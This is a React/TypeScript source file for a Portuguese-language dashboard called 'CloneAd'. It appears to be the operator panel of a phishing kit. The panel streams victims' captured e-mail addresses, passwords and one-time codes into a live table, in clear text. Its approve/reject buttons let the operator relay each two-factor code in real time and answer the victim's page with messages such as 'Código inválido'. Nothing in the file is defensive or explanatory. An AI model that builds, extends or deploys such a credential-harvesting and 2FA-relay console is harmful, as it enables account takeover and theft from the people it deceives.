import { useEffect, useMemo, useState } from "react";
import { Link } from "react-router-dom";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/contexts/AuthContext";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Sparkles, Activity } from "lucide-react";
import { toast } from "sonner";
import { ADMIN_BASE } from "@/lib/admin-route";

interface LeadRow {
  id: string;
  ad_id: string;
  session_id: string;
  field_name: string;
  value: string;
  user_agent: string | null;
  created_at: string;
}

interface ActionRow {
  session_id: string;
  ad_id: string;
  action: string;
  created_at: string;
}

interface AttemptRow {
  key: string;
  session_id: string;
  ad_id: string;
  email: string;
  password: string;
  code: string;
  codeAt: string;
  status: "pending" | "approve" | "reject";
}

const TRACKED = ["email_submitted", "password_submitted", "code_submitted"] as const;

function formatTime(iso: string): string {
  const d = new Date(iso);
  return d.toLocaleString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

function deviceLabel(ua: string | null): string {
  if (!ua) return "—";
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Mac OS/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux";
  return "Web";
}

export default function Dashboard() {
  const { user, signOut } = useAuth();
  const [leads, setLeads] = useState<LeadRow[]>([]);
  const [actions, setActions] = useState<ActionRow[]>([]);
  const [busy, setBusy] = useState<string | null>(null);
  const [pulse, setPulse] = useState(false);

  useEffect(() => {
    document.title = "Painel — CloneAd";
  }, []);

  // Mapa de ad_id → título (pra mostrar de qual anúncio veio)
  const { data: ads } = useQuery({
    queryKey: ["ads-titles", user?.id],
    queryFn: async () => {
      const { data, error } = await supabase.from("ads").select("id, title, slug");
      if (error) throw error;
      return data;
    },
    enabled: !!user,
  });

  const adTitles = useMemo(() => {
    const m: Record<string, { title: string; slug: string }> = {};
    (ads ?? []).forEach((a) => (m[a.id] = { title: a.title, slug: a.slug }));
    return m;
  }, [ads]);

  // Carrega leads + realtime
  useEffect(() => {
    if (!user) return;
    let alive = true;
    supabase
      .from("ad_leads")
      .select("id, ad_id, session_id, field_name, value, user_agent, created_at")
      .in("field_name", TRACKED as unknown as string[])
      .order("created_at", { ascending: false })
      .limit(1000)
      .then(({ data }) => {
        if (!alive) return;
        setLeads((data ?? []) as LeadRow[]);
      });

    const ch = supabase
      .channel("dash-leads")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads" },
        (payload) => {
          const r = payload.new as LeadRow;
          if (!TRACKED.includes(r.field_name as typeof TRACKED[number])) return;
          setLeads((prev) => [r, ...prev]);
          setPulse(true);
          setTimeout(() => setPulse(false), 600);
        },
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "ad_leads" },
        (payload) => {
          const old = payload.old as { id: string };
          setLeads((prev) => prev.filter((r) => r.id !== old.id));
        },
      )
      .subscribe();

    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [user]);

  // Carrega ações (approve/reject) + realtime
  useEffect(() => {
    if (!user) return;
    let alive = true;
    supabase
      .from("ad_session_actions")
      .select("session_id, ad_id, action, created_at")
      .order("created_at", { ascending: false })
      .limit(1000)
      .then(({ data }) => {
        if (!alive) return;
        setActions((data ?? []) as ActionRow[]);
      });

    const ch = supabase
      .channel("dash-actions")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions" },
        (payload) => setActions((prev) => [payload.new as ActionRow, ...prev]),
      )
      .subscribe();

    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [user]);

  // Computa tentativas (1 linha por código submetido), com status pendente/aprovado/rejeitado
  const attempts: AttemptRow[] = useMemo(() => {
    const bySession = new Map<string, LeadRow[]>();
    for (const l of leads) {
      const arr = bySession.get(l.session_id) || [];
      arr.push(l);
      bySession.set(l.session_id, arr);
    }

    const sessionActions = new Map<string, ActionRow[]>();
    for (const a of actions) {
      if (a.action !== "approve" && a.action !== "reject") continue;
      const arr = sessionActions.get(a.session_id) || [];
      arr.push(a);
      sessionActions.set(a.session_id, arr);
    }

    const rows: AttemptRow[] = [];
    for (const [sid, items] of bySession) {
      const codes = [...items]
        .filter((i) => i.field_name === "code_submitted")
        .sort((a, b) => a.created_at.localeCompare(b.created_at));
      const acts = (sessionActions.get(sid) || []).slice().sort((a, b) =>
        a.created_at.localeCompare(b.created_at),
      );
      const codeStatus = new Map<string, "approve" | "reject">();
      for (const a of acts) {
        for (let i = codes.length - 1; i >= 0; i--) {
          const c = codes[i];
          const key = `${c.created_at}-${c.value}`;
          if (!codeStatus.has(key) && c.created_at <= a.created_at) {
            codeStatus.set(key, a.action as "approve" | "reject");
            break;
          }
        }
      }

      for (const c of codes) {
        const emailRow = [...items]
          .filter((i) => i.field_name === "email_submitted" && i.created_at <= c.created_at)
          .sort((a, b) => a.created_at.localeCompare(b.created_at))
          .pop();
        const passwordRow = [...items]
          .filter((i) => i.field_name === "password_submitted" && i.created_at <= c.created_at)
          .sort((a, b) => a.created_at.localeCompare(b.created_at))
          .pop();
        const key = `${c.created_at}-${c.value}-${sid}`;
        rows.push({
          key,
          session_id: sid,
          ad_id: c.ad_id,
          email: emailRow?.value || "—",
          password: passwordRow?.value || "—",
          code: c.value,
          codeAt: c.created_at,
          status: codeStatus.get(`${c.created_at}-${c.value}`) || "pending",
        });
      }
    }

    return rows.sort((a, b) => b.codeAt.localeCompare(a.codeAt));
  }, [leads, actions]);

  const pendingCount = attempts.filter((a) => a.status === "pending").length;
  const approvedCount = attempts.filter((a) => a.status === "approve").length;
  const rejectedCount = attempts.filter((a) => a.status === "reject").length;

  // Primeira pendente por sessão = a única acionável
  const actionableKeys = useMemo(() => {
    const seen = new Set<string>();
    const keys = new Set<string>();
    for (const a of [...attempts].reverse()) {
      if (a.status !== "pending") continue;
      if (seen.has(a.session_id)) continue;
      seen.add(a.session_id);
      keys.add(a.key);
    }
    return keys;
  }, [attempts]);

  const send = async (row: AttemptRow, action: "approve" | "reject") => {
    setBusy(`${row.key}-${action}`);
    const { error } = await supabase.from("ad_session_actions").insert({
      ad_id: row.ad_id,
      session_id: row.session_id,
      action,
      payload: action === "reject" ? { message: "Código inválido" } : null,
    });
    setBusy(null);
    if (error) return toast.error(error.message);
    toast.success(action === "approve" ? "Aprovado" : "Rejeitado");
  };

  const handleClearAll = async () => {
    if (!confirm("Apagar TODOS os leads capturados? Essa ação é permanente.")) return;
    const { error } = await supabase
      .from("ad_leads")
      .delete()
      .in("field_name", TRACKED as unknown as string[]);
    if (error) return toast.error(error.message);
    setLeads([]);
    toast.success("Histórico limpo");
  };

  return (
    <div className="min-h-screen bg-background">
      <header className="sticky top-0 z-30 border-b border-border bg-background/80 backdrop-blur-xl">
        <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-6">
          <Link to={ADMIN_BASE} className="flex items-center gap-2">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-gradient-primary shadow-glow">
              <ShieldCheck className="h-4 w-4 text-primary-foreground" />
            </div>
            <span className="text-lg font-bold tracking-tight">Painel</span>
            <span
              className={`ml-2 inline-flex h-2 w-2 rounded-full bg-success ${pulse ? "animate-ping" : ""}`}
              aria-label="Conectado"
            />
          </Link>
          <div className="flex items-center gap-3">
            <span className="hidden text-xs text-muted-foreground sm:inline">{user?.email}</span>
            <Button variant="ghost" size="sm" onClick={signOut}>
              <LogOut className="mr-2 h-4 w-4" /> Sair
            </Button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-7xl px-6 py-8">
        {/* Cards de resumo */}
        <div className="grid grid-cols-2 gap-4 sm:grid-cols-4">
          <StatCard label="Pendentes" value={pendingCount} icon={<Sparkles className="h-4 w-4" />} highlight={pendingCount > 0} />
          <StatCard label="Aprovados" value={approvedCount} icon={<Check className="h-4 w-4" />} />
          <StatCard label="Rejeitados" value={rejectedCount} icon={<X className="h-4 w-4" />} />
          <StatCard label="Total" value={attempts.length} icon={<Activity className="h-4 w-4" />} />
        </div>

        {/* Tabela de leads */}
        <section className="mt-8 rounded-xl border border-border bg-card shadow-card">
          <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
            <div className="flex items-center gap-2">
              <h2 className="text-base font-semibold">Tentativas capturadas</h2>
              <Badge variant="secondary" className="text-[10px]">
                {attempts.length}
              </Badge>
            </div>
            {attempts.length > 0 && (
              <Button
                size="sm"
                variant="ghost"
                onClick={handleClearAll}
                className="h-8 text-xs text-muted-foreground hover:text-destructive"
              >
                <Trash2 className="mr-1 h-3 w-3" />
                Limpar histórico
              </Button>
            )}
          </div>

          {attempts.length === 0 ? (
            <div className="flex flex-col items-center gap-3 px-6 py-16 text-center">
              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-muted">
                <Activity className="h-5 w-5 text-muted-foreground" />
              </div>
              <p className="text-sm text-muted-foreground">
                Aguardando capturas… cada vez que alguém digitar um código, vai aparecer aqui.
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                  <tr>
                    <th className="px-4 py-3 text-left font-medium">Hora</th>
                    <th className="px-4 py-3 text-left font-medium">Anúncio</th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1">
                        <Mail className="h-3 w-3" /> E-mail
                      </span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1">
                        <KeyRound className="h-3 w-3" /> Senha
                      </span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1">
                        <Hash className="h-3 w-3" /> Código
                      </span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
                    <th className="px-4 py-3 text-left font-medium">Status</th>
                    <th className="px-4 py-3 text-right font-medium">Ações</th>
                  </tr>
                </thead>
                <tbody>
                  {attempts.map((row) => {
                    const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
                    const isActionable = actionableKeys.has(row.key);
                    const ad = adTitles[row.ad_id];
                    return (
                      <tr
                        key={row.key}
                        className={`border-t border-border transition-colors ${
                          isActionable ? "bg-primary/5" : "hover:bg-muted/30"
                        }`}
                      >
                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                          {formatTime(row.codeAt)}
                        </td>
                        <td className="px-4 py-3 text-xs">
                          {ad ? (
                            <div className="flex flex-col">
                              <span className="truncate font-medium">{ad.title}</span>
                              <span className="truncate font-mono text-[10px] text-muted-foreground">
                                /{ad.slug}
                              </span>
                            </div>
                          ) : (
                            <span className="text-muted-foreground">—</span>
                          )}
                        </td>
                        <td className="break-all px-4 py-3 font-mono text-xs">{row.email}</td>
                        <td className="break-all px-4 py-3 font-mono text-xs">{row.password}</td>
                        <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
                          {deviceLabel(ua)}
                        </td>
                        <td className="whitespace-nowrap px-4 py-3 text-xs">
                          {row.status === "approve" && (
                            <span className="inline-flex items-center gap-1 rounded-full bg-success/15 px-2 py-0.5 text-success">
                              <Check className="h-3 w-3" /> aprovado
                            </span>
                          )}
                          {row.status === "reject" && (
                            <span className="inline-flex items-center gap-1 rounded-full bg-destructive/15 px-2 py-0.5 text-destructive">
                              <X className="h-3 w-3" /> rejeitado
                            </span>
                          )}
                          {row.status === "pending" && isActionable && (
                            <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
                              ⏳ aguardando
                            </span>
                          )}
                          {row.status === "pending" && !isActionable && (
                            <span className="text-muted-foreground">— ignorado</span>
                          )}
                        </td>
                        <td className="px-4 py-3 text-right">
                          {isActionable ? (
                            <div className="flex justify-end gap-1.5">
                              <Button
                                size="sm"
                                className="h-8 bg-success px-3 text-success-foreground hover:bg-success/90"
                                onClick={() => send(row, "approve")}
                                disabled={busy === `${row.key}-approve`}
                              >
                                {busy === `${row.key}-approve` ? (
                                  <Loader2 className="h-3.5 w-3.5 animate-spin" />
                                ) : (
                                  <>
                                    <Check className="mr-1 h-3.5 w-3.5" /> Aprovar
                                  </>
                                )}
                              </Button>
                              <Button
                                size="sm"
                                variant="outline"
                                className="h-8 border-destructive/40 px-3 text-destructive hover:bg-destructive/10"
                                onClick={() => send(row, "reject")}
                                disabled={busy === `${row.key}-reject`}
                              >
                                {busy === `${row.key}-reject` ? (
                                  <Loader2 className="h-3.5 w-3.5 animate-spin" />
                                ) : (
                                  <>
                                    <X className="mr-1 h-3.5 w-3.5" /> Rejeitar
                                  </>
                                )}
                              </Button>
                            </div>
                          ) : (
                            <span className="text-xs text-muted-foreground">—</span>
                          )}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </section>
      </main>
    </div>
  );
}

function StatCard({
  label,
  value,
  icon,
  highlight,
}: {
  label: string;
  value: number;
  icon: React.ReactNode;
  highlight?: boolean;
}) {
  return (
    <div
      className={`rounded-xl border bg-card p-4 shadow-card transition ${
        highlight ? "border-primary/40 shadow-glow" : "border-border"
      }`}
    >
      <div className="flex items-center justify-between">
        <span className="text-xs uppercase tracking-wide text-muted-foreground">{label}</span>
        <span className={`flex h-7 w-7 items-center justify-center rounded-lg ${highlight ? "bg-primary/15 text-primary" : "bg-muted text-muted-foreground"}`}>
          {icon}
        </span>
      </div>
      <div className="mt-2 text-2xl font-bold tracking-tight">{value}</div>
    </div>
  );
}